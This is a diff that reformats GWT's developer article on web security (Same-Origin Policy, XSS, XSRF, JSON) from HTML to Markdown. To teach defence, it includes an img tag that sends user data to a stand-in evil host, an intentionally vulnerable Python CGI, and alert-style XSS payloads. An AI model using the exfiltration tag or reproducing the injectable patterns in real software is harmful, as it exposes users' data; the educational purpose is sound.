@@ -30,7 +30,11 @@ The [Same-Origin Policy](http://en.wikipedia.org/wiki/Same_origin_policy) (SOP) 
 
 There is, however, a way around the Same-Origin Policy, and it all starts with trust. A web page owns its own data, of course, and is free to submit that data back to the web site it came from. JavaScript code that's already running is trusted to not be evil, and to know what it's doing. If code is already running, it's too late to stop it from doing anything evil anyway, so you might as well trust it.
 
-One thing that JavaScript code is trusted to do is load more content. For example, you might build a basic image gallery application by writing some JavaScript code that inserts and deletes &lt;img&gt; tags into the current page. When you insert an &lt;img&gt; tag, the browser immediately loads the image as if it had been present in the original page; if you delete (or hide) an &lt;img&gt; tag, the browser removes it from the display.
+One thing that JavaScript code is trusted to do is load more content. For example, you might
+build a basic image gallery application by writing some JavaScript code that inserts and deletes
+`<img>` tags into the current page. When you insert an `<img>` tag, the browser
+immediately loads the image as if it had been present in the original page; if you delete (or
+hide) an `<img>` tag, the browser removes it from the display.
 
 Essentially, the SOP lets JavaScript code do anything that the original HTML page could have done -- it just prevents that JavaScript from sending data to a different server, or from reading or writing data belonging to a different server.
 
@@ -38,72 +42,91 @@ Essentially, the SOP lets JavaScript code do anything that the original HTML pag
 
 The text above said, "prevents JavaScript from sending data to a different server." Unfortunately, that's not strictly true. In fact it is possible to send data to a different server, although it might be more accurate to say "leak."
 
-JavaScript is free to add new resources -- such as &lt;img&gt; tags -- to the current page. You probably know that you can cause an image hosted on foo.com to appear inline in a page served up by bar.com. Indeed, some people get upset if you do this to their images, since it uses their bandwidth to serve an image to your web visitor. But, it's a feature of HTML, and since HTML can do it, so can JavaScript.
+JavaScript is free to add new resources -- such as `<img>` tags -- to the current page. You
+probably know that you can cause an image hosted on foo.com to appear inline in a page served up by bar.com. Indeed, some people get upset if you do this to their images, since it uses their bandwidth to serve an image to your web visitor. But, it's a feature of HTML, and since HTML can do it, so can JavaScript.
 
 Normally you would view this as a read-only operation: the browser requests an image, and the server sends the data. The browser didn't upload anything, so no data can be lost, right? Almost, but not quite. The browser _did_ upload something: namely, the URL of the image. Images use standard URLs, and any URL can have query parameters encoded in it. A legitimate use case for this might be a page hit counter image, where a CGI on the server selects an appropriate image based on a query parameter and streams the data to the user in response. Here is a reasonable (though hypothetical) URL that could return a hit-count image showing the number '42':
 
-<pre>
+```
 http://site.domain.tld/pagehits?count=42
-</pre>
+```
 
-In the static HTML world, this is perfectly reasonable. After all, the server is not going to send the client to a web site that will leak the server's or user's data -- at least, not on purpose. Because this technique is legal in HTML, it's also legal in JavaScript, but there is an unintended consequence. If some evil JavaScript code gets injected into a good web page, it can construct &lt;img&gt; tags and add them to the page.
+In the static HTML world, this is perfectly reasonable. After all, the server is not going to
+send the client to a web site that will leak the server's or user's data -- at least, not on
+purpose. Because this technique is legal in HTML, it's also legal in JavaScript, but there is an
+unintended consequence. If some evil JavaScript code gets injected into a good web page, it can
+construct `<img>` tags and add them to the page.
 
-It is then free to construct a URL to any hostile domain, stick it in an &lt;img&gt; tag, and make the request. It's not hard to imagine a scenario where the evil code steals some useful information and encodes it in the &lt;img&gt; URL; an example might be a tag such as:
+It is then free to construct a URL to any hostile domain, stick it in an `<img>` tag, and
+make the request. It's not hard to imagine a scenario where the evil code steals some useful
+information and encodes it in the `<img>` URL; an example might be a tag such as:
 
-<pre>
-&lt;img src="http://evil.domain.tld/pagehits?private_user_data=12345"/&gt;
-</pre>
+```
+<img src="http://evil.domain.tld/pagehits?private_user_data=12345"/>
+```
 
 If `private_user_data` is a password, credit card number, or something similar, there'd be a major problem. If the evil code sets the size of the image to 1 pixel by 1 pixel, it's very unlikely the user will even notice it.
 
 ### Cross-Site Scripting <a id="cross-site"></a>
 
-The type of vulnerability just described is an example of a class of attacks called "Cross-Site Scripting" (abbreviated as "XSS"). These attacks involve browser script code that transmits data (or does even worse things) across sites. These attacks are not limited to &lt;img&gt; tags, either; they can be used in most places the browser lets script code access URLs. Here are some more examples of XSS attacks:
+The type of vulnerability just described is an example of a class of attacks called "Cross-Site
+Scripting" (abbreviated as "XSS"). These attacks involve browser script code that transmits data
+(or does even worse things) across sites. These attacks are not limited to `<img>` tags,
+either; they can be used in most places the browser lets script code access URLs.
+Here are some more examples of XSS attacks:
 
-*   **Evil code creates a hidden iframe and then adds a &lt;form&gt; to it**. The form's action is set to a URL on a server under the attacker's control. It then fills the form with hidden fields containing information taken from the parent page, and then submits the form.
+*   **Evil code creates a hidden iframe and then adds a `<form>` to it**. The form's action
+is set to a URL on a server under the attacker's control. It then fills the form with hidden fields containing information taken from the parent page, and then submits the form.
 *   **Evil code creates a hidden iframe, constructs a URL with query parameters** containing information taken from the parent page, and then sets the iframe's "src" to a URL on a server under the attacker's control.
-*   **Evil code creates a &lt;script&gt; tag**, which functions almost identically to the &lt;img&gt; attack. (Actually, it's a lot worse, as I'll explain in a later section.)
+*   **Evil code creates a `<script>` tag**, which functions almost identically to the
+`<img>` attack. (Actually, it's a lot worse, as I'll explain in a later section.)
 
-Clearly, if evil code gets into your page, it can do some nasty stuff. By the way, don't take my examples above as a complete list; there are far too many variants of this trick to describe here.
+Clearly, if evil code gets into your page, it can do some nasty stuff. By the way, don't take my
+examples above as a complete list; there are far too many variants of this trick to describe here.
 
-Throughout all this there's a really big assumption, though: namely, that evil JavaScript code could get itself into a good page in the first place. This sounds like it should be hard to do; after all, servers aren't going to intentionally include evil code in the HTML data they send to web browsers. Unfortunately, it turns out to be quite easy to do if the server (and sometimes even client) programmers are not constantly vigilant. And as always, evil people are spending huge chunks of their lives thinking up ways to do this.
+Throughout all this there's a really big assumption, though: namely, that evil JavaScript code
+could get itself into a good page in the first place. This sounds like it should be hard to do;
+after all, servers aren't going to intentionally include evil code in the HTML data they send to
+web browsers. Unfortunately, it turns out to be quite easy to do if the server (and sometimes
+even client) programmers are not constantly vigilant. And as always, evil people are spending h
+uge chunks of their lives thinking up ways to do this.
 
 The list of ways that evil code can get into an otherwise good page is endless. Usually they all boil down to unwary code that parrots user input back to the user. For instance, this Python CGI code is vulnerable:
 
-<pre>
+```
 import cgi
 f = cgi.FieldStorage()
 name = f.getvalue('name') or 'there'
 
-s = '&lt;html&gt;&lt;body&gt;&lt;div&gt;Hello, ' + name + '!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'
+s = '<html><body><div>Hello, ' + name + '!</div></body></html>'
 
 print 'Content-Type: text/html'
 print 'Content-Length: %s' % (len(s),)
 print
 print s
-</pre>
+```
 
 The code is supposed to print a simple greeting, based on a form input. For instance, a URL like this one would print "Hello, Dan!":
 
-<pre>
+```
 http://site.domain.tld/path?name=Dan
-</pre>
+```
 
 However, because the CGI doesn't inspect the value of the "name" variable, an attacker can insert script code in there.
 
 Here is some JavaScript that pops up an alert window:
 
-<pre>
-&lt;script&gt;alert('Hi');&lt;/script&gt;
-</pre>
+```
+<script>alert('Hi');</script>
+```
 
 That script code can be encoded into a URL such as this:
 
-<pre>
+```
 http://site.domain.tld/path?name=Dan%3Cscript%20%3Ealert%28%22Hi%22%29%3B%3C/script%3E
-</pre>
+```
 
-That URL, when run against the CGI above, inserts the &lt;script&gt; tag directly into the &lt;div&gt; block in the generated HTML. When the user loads the CGI page, it still says "Hello, Dan!" but it also pops up a JavaScript alert window.
+That URL, when run against the CGI above, inserts the `<script>`tag directly into the `<div>`block in the generated HTML. When the user loads the CGI page, it still says "Hello, Dan!" but it also pops up a JavaScript alert window.
 
 It's not hard to imagine an attacker putting something worse than a mere JavaScript alert in that URL. It's also probably not hard to imagine how easy it is for your real-world, more complex server-side code to accidentally contain such vulnerabilities. Perhaps the scariest thing of all is that an evil URL like the one above can exploit your servers entirely without your involvement.
 
@@ -143,7 +166,7 @@ As bad as XSS and XSRF are, JSON gives them room to breathe, so to speak, which 
 
         Typically these strings are parsed via a call to JavaScript's 'eval' function for fast decoding.
 
-*   A string containing a JSON object assigned to a variable, returned by a server as the response to a &lt;script&gt; tag.
+*   A string containing a JSON object assigned to a variable, returned by a server as the response to a `<script>`tag.
 
         Example:
 
@@ -155,11 +178,11 @@ As bad as XSS and XSRF are, JSON gives them room to breathe, so to speak, which 
 
         ` handleResult({'data': ['foo', 'bar']});`
 
-The last two examples are most useful when returned from a server as the response to a &lt;script&gt; tag inclusion. This could use a little explanation. Earlier text described how JavaScript is permitted to dynamically add &lt;img&gt; tags pointing to images on remote sites. The same is true of &lt;script&gt; tags: JavaScript code can dynamically insert new &lt;script&gt; tags that cause more JavaScript code to load.
+The last two examples are most useful when returned from a server as the response to a `<script>`tag inclusion. This could use a little explanation. Earlier text described how JavaScript is permitted to dynamically add `<img>`tags pointing to images on remote sites. The same is true of `<script>`tags: JavaScript code can dynamically insert new `<script>` tags that cause more JavaScript code to load.
 
-This makes dynamic &lt;script&gt; insertion a very useful technique, especially for mashups. Mashups frequently need to fetch data from different sites, but the Same-Origin Policy prevents them from doing so directly with an XMLHTTPRequest call. However, currently-running JavaScript code is trusted to load new JavaScript code from different sites -- and who says that code can't actually be data?
+This makes dynamic `<script>` insertion a very useful technique, especially for mashups. Mashups frequently need to fetch data from different sites, but the Same-Origin Policy prevents them from doing so directly with an XMLHTTPRequest call. However, currently-running JavaScript code is trusted to load new JavaScript code from different sites -- and who says that code can't actually be data?
 
-This concept might seem suspicious at first since it seems like a violation of the Same-Origin restriction, but it really isn't. Code is either trusted or it's not. Loading more code is more dangerous than loading data, so since your current code is already trusted to load more code, why should it not be trusted to load data as well? Meanwhile, &lt;script&gt; tags can only be inserted by trusted code in the first place, and the entire meaning of trust is that... you trust it to know what it's doing. It's true that XSS can abuse trust, but ultimately XSS can only originate from buggy server code. Same-Origin is based on trusting the server -- bugs and all.
+This concept might seem suspicious at first since it seems like a violation of the Same-Origin restriction, but it really isn't. Code is either trusted or it's not. Loading more code is more dangerous than loading data, so since your current code is already trusted to load more code, why should it not be trusted to load data as well? Meanwhile, `<script>` tags can only be inserted by trusted code in the first place, and the entire meaning of trust is that... you trust it to know what it's doing. It's true that XSS can abuse trust, but ultimately XSS can only originate from buggy server code. Same-Origin is based on trusting the server -- bugs and all.
 
 So what does this mean? How is writing a server-side service that exposes data via these methods vulnerable? Well, other people have explained this a lot better than we can cover it here. Here are some good treatments:
 
@@ -174,7 +197,7 @@ But this is an article for GWT developers, right? So how are GWT developers affe
 
 ### XSS and GWT <a id="xss"></a>
 
-  Also see [SafeHtml](../doc/latest/DevGuideSecuritySafeHtml.html) &ndash; Provides coding guidelines with examples showing how to protect your application from XSS vulnerabilities due to untrusted data
+  Also see [SafeHtml](../doc/latest/DevGuideSecuritySafeHtml.html) -- Provides coding guidelines with examples showing how to protect your application from XSS vulnerabilities due to untrusted data
 
 XSS can be avoided if you rigorously follow good JavaScript programming practices. Since GWT helps you follow good JavaScript practices in general, it can help you with XSS. However, GWT developers are not immune, and there simply is no magic bullet.
 
@@ -201,24 +224,24 @@ It's a common technique to fill out the bodies of tables, DIVs, frames, and simi
 
 Here's an example. Consider this basic JavaScript page:
 
-<pre>
-&lt;html&gt;
-&lt;head&gt;
-  &lt;script language="JavaScript"&gt;
+```
+<html>
+<head>
+  <script language="JavaScript">
     function fillMyDiv(newContent) {
       document.getElementById('mydiv').innerHTML = newContent;
     }
-  &lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Some text before mydiv.&lt;/p&gt;
-  &lt;div id="mydiv"&gt;&lt;/div&gt;
-  &lt;p&gt;Some text after mydiv.&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</pre>
+  </script>
+</head>
+<body>
+  <p>Some text before mydiv.</p>
+  <div id="mydiv"></div>
+  <p>Some text after mydiv.</p>
+</body>
+</html>
+```
 
-The page contains a placeholder &lt;div&gt; named 'mydiv', and a JavaScript function that simply sets innerHTML on that div. The idea is that you would call that function from other code on your page whenever you wanted to update the content being displayed. However, suppose an attacker contrives to get a user to pass in this HTML as the 'newContent' variable: `<div onmousemove="alert('Hi!');">Some text</div>`
+The page contains a placeholder `<div>` named 'mydiv', and a JavaScript function that simply sets innerHTML on that div. The idea is that you would call that function from other code on your page whenever you wanted to update the content being displayed. However, suppose an attacker contrives to get a user to pass in this HTML as the 'newContent' variable: `<div onmousemove="alert('Hi!');">Some text</div>`
 
 Whenever the user mouses over 'mydiv', an alert will appear. If that's not frightening enough, there are other techniques -- only slightly more complicated -- that can execute code immediately without even needing to wait for user input. This is why setting innerHTML can be dangerous; you've got to be sure that the strings you use are trusted.
 
@@ -249,11 +272,11 @@ As a GWT user, you can help reduce XSS vulnerabilities in your code by following
 *   Carefully inspect any strings you pass to eval or assign to innerHTML via a JSNI method
 *   Take care in your native JSNI methods to not do anything that would expose you to attacks
 
-The GWT team is considering adding support for standard string inspection to the GWT library. You would use this to validate any untrusted string to determine if it contains unsafe data (such as a &lt;script&gt; tag.) The idea is that you'd use this method to help you inspect any strings you need to pass to innerHTML or eval. However, this functionality is only being considered right now, so for the time being it's still important to do your own inspections. Be sure to follow the guidelines above -- and be sure to be paranoid!
+The GWT team is considering adding support for standard string inspection to the GWT library. You would use this to validate any untrusted string to determine if it contains unsafe data (such as a `<script>` tag.) The idea is that you'd use this method to help you inspect any strings you need to pass to innerHTML or eval. However, this functionality is only being considered right now, so for the time being it's still important to do your own inspections. Be sure to follow the guidelines above -- and be sure to be paranoid!
 
 ### XSRF and GWT <a id="xsrf"></a>
 
-  Also see [GWT RPC XSRF protection](../doc/latest/DevGuideSecurityRpcXsrf.html) &ndash; Explains how to protect GWT RPCs against XSRF attacks using RPC tokens introduced in GWT 2.3.
+  Also see [GWT RPC XSRF protection](../doc/latest/DevGuideSecurityRpcXsrf.html) -- Explains how to protect GWT RPCs against XSRF attacks using RPC tokens introduced in GWT 2.3.
 
 You can take steps to make your GWT application less vulnerable to XSRF attacks. The same techniques that you might use to protect other AJAX code will also work to protect your GWT application.
 
@@ -263,29 +286,29 @@ A common countermeasure for XSRF attacks involves duplicating a session cookie. 
 
 If you are using the [RequestBuilder](/javadoc/latest/com/google/gwt/http/client/RequestBuilder.html) and [RequestCallback](/javadoc/latest/com/google/gwt/http/client/RequestCallback.html) classes in GWT, you can implement XSRF protection by setting a custom header to contain the value of your cookie. Here is some sample code:
 
-<pre>
+```
 RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, url);
 rb.setHeader("X-XSRF-Cookie", Cookies.getCookie("myCookieKey"));
 rb.sendRequest(null, myCallback);
-</pre>
+```
 
 If you are using GWT's RPC mechanism, the solution is unfortunately not quite as clean. However, there are still several ways you can accomplish it. For instance, you can add an argument to each method in your [RemoteService](/javadoc/latest/com/google/gwt/user/client/rpc/RemoteService.html) interface that contains a String. That is, if you wanted this interface:
 
-<pre>
+```
 public interface MyInterface extends RemoteService {
   public boolean doSomething();
   public void doSomethingElse(String arg);
 }
-</pre>
+```
 
 ...you could actually use this:
 
-<pre>
+```
 public interface MyInterface extends RemoteService {
   public boolean doSomething(String cookieValue);
   public void doSomethingElse(String cookieValue, String arg);
 }
-</pre>
+```
 
 When you call the method, you would pass in the current cookie value that you fetch using `Cookies.getCookie(String)`.
 
@@ -305,17 +328,17 @@ That said, some people advise JSON developers to employ an extra precaution besi
 
 The client code is then expected to strip the comment characters prior to passing the string to the eval function.
 
-The primary effect of this is that it prevents your JSON data from being stolen via a &lt;script&gt; tag. If you normally expect your server to export JSON data in response to a direct XMLHTTPRequest, this technique would prevent attackers from executing an XSRF attack against your server and stealing the response data via one of the attacks linked to earlier.
+The primary effect of this is that it prevents your JSON data from being stolen via a `<script>` tag. If you normally expect your server to export JSON data in response to a direct XMLHTTPRequest, this technique would prevent attackers from executing an XSRF attack against your server and stealing the response data via one of the attacks linked to earlier.
 
-If you only intend your JSON data to be returned via an XMLHTTPRequest, wrapping the data in a block comment prevents someone from stealing it via a &lt;script&gt; tag. If you are using JSON as the data format exposed by your own services and don't intend servers in other domains to use it, then there is no reason not to use this technique. It might keep your data safe even in the event that an attacker manages to forge a cookie.
+If you only intend your JSON data to be returned via an XMLHTTPRequest, wrapping the data in a block comment prevents someone from stealing it via a `<script>` tag. If you are using JSON as the data format exposed by your own services and don't intend servers in other domains to use it, then there is no reason not to use this technique. It might keep your data safe even in the event that an attacker manages to forge a cookie.
 
 #### Protecting Your Mashup
 
 You should also use the XSRF cookie-duplication countermeasure if you're exposing services for other mashups to use. However, if you're building a JSONP service that you want to expose publicly, the second comment-block technique we just described will be a hindrance.
 
-The reason is that the comment-wrapping technique works by totally disabling support for &lt;script&gt; tags. Since that is at the heart of JSONP, it disables that technique. If you are building a web service that you want to be used by other sites for in-browser mashups, then this technique would prevent that.
+The reason is that the comment-wrapping technique works by totally disabling support for `<script>` tags. Since that is at the heart of JSONP, it disables that technique. If you are building a web service that you want to be used by other sites for in-browser mashups, then this technique would prevent that.
 
-Conversely, be very careful if you're building mashups with someone else's site! If your application is a "JSON consumer" fetching data from a different domain via dynamic &lt;script&gt; tags, you are exposed to any vulnerabilities they may have. If their site is compromised, your application could be as well. Unfortunately, with the current state of the art, there isn't much you can do about this. After all -- by using a &lt;script&gt; tag, you're trusting their site. You just have to be sure that your trust is well-placed.
+Conversely, be very careful if you're building mashups with someone else's site! If your application is a "JSON consumer" fetching data from a different domain via dynamic `<script>` tags, you are exposed to any vulnerabilities they may have. If their site is compromised, your application could be as well. Unfortunately, with the current state of the art, there isn't much you can do about this. After all -- by using a `<script>` tag, you're trusting their site. You just have to be sure that your trust is well-placed.
 
 In other words, if you have critical private information on your own server, you should probably avoid in-browser JSONP-style mashups with another site. Instead, you might consider building your server to act as a relay or proxy to the other site. With that technique, the browser only communicates with your site, which allows you to use more rigorous protections. It may also provide you with an additional opportunity to inspect strings for evil code.
 
